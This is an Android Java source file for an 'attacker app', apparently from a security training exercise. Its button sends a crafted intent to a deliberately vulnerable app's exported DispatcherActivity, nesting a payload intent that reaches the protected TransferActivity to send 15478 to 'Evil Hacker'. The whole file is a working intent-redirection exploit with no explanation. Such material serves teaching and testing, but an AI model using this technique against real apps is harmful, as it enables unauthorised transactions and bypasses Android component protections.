package positive.on.techtrain_nestedintent_attackerapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        findViewById(R.id.hack).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = Intent.makeMainActivity(new ComponentName(
                        "positive.on.techtrain2018_nestedintent_vulnapp",
                        "positive.on.techtrain2018_nestedintent_vulnapp.DispatcherActivity"));
                Intent payload = new Intent();
                payload.putExtra("to","Evil Hacker");
                payload.putExtra("amount","15478");
                intent.putExtra("next",payload);
                intent.putExtra("target","positive.on.techtrain2018_nestedintent_vulnapp.TransferActivity");
                startActivity(intent);
            }
        });
    }
}
